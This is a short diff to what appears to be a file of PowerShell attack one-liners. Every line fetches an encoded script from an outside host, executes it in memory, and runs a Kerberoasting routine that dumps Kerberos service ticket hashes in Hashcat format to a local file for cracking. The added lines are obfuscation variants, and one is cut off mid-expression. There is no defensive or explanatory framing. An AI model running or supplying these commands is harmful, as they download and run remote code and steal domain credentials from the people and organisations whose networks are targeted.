@@ -1,3 +1,5 @@
 IEX (Invoke-WebRequest 'http://jimrush.me/kb64.txt');Invoke-kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty hash | out-file -Encoding ASCII c:\temp\kerb.out
 
 IEX [System.Convert]::FromBase64String((Invoke-WebRequest 'https://jimrush.me/kb64.txt'));Invoke-K -OutputFormat Hashcat | Select-Object -ExpandProperty hash | out-file -Encoding ASCII c:\temp\kerb.out
+IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String
+IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Invoke-WebRequest 'https://jimrush.me/kb64.txt'))));Invoke-K -OutputFormat Hashcat | Select-Object -ExpandProperty hash | out-file -Encoding ASCII c:\temp\kerb.out
